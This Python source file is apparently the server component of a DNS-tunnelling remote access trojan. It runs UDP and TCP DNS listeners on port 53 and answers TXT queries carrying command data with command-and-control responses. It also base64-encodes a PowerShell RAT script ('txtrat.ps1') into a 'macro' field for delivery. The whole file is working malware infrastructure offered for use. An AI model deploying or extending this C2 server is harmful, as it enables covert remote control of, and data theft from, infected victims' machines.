import socket
import json
import threading
from optparse import OptionParser
import os
import base64

import request
import response
import settings
import command
import console

from time import sleep


def dnsServer(address, socketProto):

    sock = socket.socket(socket.AF_INET, socketProto)
    sock.bind((address, 53))

    # if tcp conneciton received, net to listen and accept
    if socketProto == socket.SOCK_STREAM:
        sock.listen()
        #conn, addr = sock.accept()

    while True:
            # recieve dns request
            if socketProto == socket.SOCK_DGRAM:
                data, addr = sock.recvfrom(512)
            else:
                conn, addr = sock.accept()
                data = conn.recv(512)

            # parse query and generate response body up to query
            dnsquerybody, records, rectype, cmddata = request.parseRequest(data, socketProto)       # Argument is everyting received from dns request body
                                                                                                    # dnsquerybody: dns response up to query (ex: b'\x9c\xc2\x84\x00\x00\x01\x00\x01\x00\x00\x00\x00\x07koratxt\x03net\x00\x00\x10\x00\x01')
                                                                                                    # records: array or records to generate default response (ex: [{'name': '@', 'ttl': 400, 'value': 'Hello World!'}])
                                                                                                    # rectype: dns type that the record belongs to (ex: b'\x00\x10')
            
            if len(records) == 0:      # do not send a response if we dont have a record for it
                continue

            # generate answer section
            if len(cmddata) > 0 and rectype == b'\x00\x10':         # C2
                returndata = command.parsecommand(cmddata)
                if not returndata:
                    continue
                dnsanswerbody = response.genTxtResponse(records, returndata)
            else:                                                   # non C2
                dnsanswerbody = response.genResponse(records, rectype)

            # send response
            if socketProto == socket.SOCK_DGRAM:
                sock.sendto(dnsquerybody + dnsanswerbody, addr)
            else:
                conn.send((len(dnsquerybody + dnsanswerbody)).to_bytes(2, byteorder='big') + dnsquerybody + dnsanswerbody)
                conn.close()
            


def main():

    settings.init()
    parser = OptionParser()

    # IP address
    parser.add_option(
        "-a",
        "--address",
        help = "IPv4 address to set as main listener",
        action = "store",
        type = "string",
        dest = "address",
        default = '127.0.0.1'
    )

    # backup address
    parser.add_option(
        "-b",
        "--backup",
        help = "IPv4 address to set as backup listener for second name server",
        action = "store",
        type = "string",
        dest = "backup",
        default = ''
    )

    (options, args) = parser.parse_args()

    # setup manage.json if the file doesn't exist.  txtrat.ps1 is needed to fill macro key
    if not os.path.exists("./manage.json"):
        with settings.lock:
            manage = settings.initmanage

            with open('../txtrat.ps1', 'rb') as f:
                data = f.read()

            manage["macro"] = base64.b64encode(data).decode()

            with open('./manage.json', 'w') as f:
                json.dump(manage, f)
            os.chmod('./manage.json', 0o777)

    # start command line interface
    x = threading.Thread(target=console.newConsole, args=())
    x.start()

    # start the dns server on the primary interface
    a = threading.Thread(target=dnsServer, args=(options.address, socket.SOCK_DGRAM))
    a.start()

    # tcp required by RFC 6168
    at = threading.Thread(target=dnsServer, args=(options.address, socket.SOCK_STREAM))
    at.start()

    # RFC 6168 requires a minimum of 2 dns name servers.  This is used so name server 2 (ns2) can point to the c2 domain name
    if options.backup:
        b = threading.Thread(target=dnsServer, args=(options.backup, socket.SOCK_DGRAM))
        b.start()

        bt = threading.Thread(target=dnsServer, args=(options.backup, socket.SOCK_STREAM))
        bt.start()


if __name__ == '__main__':
    main()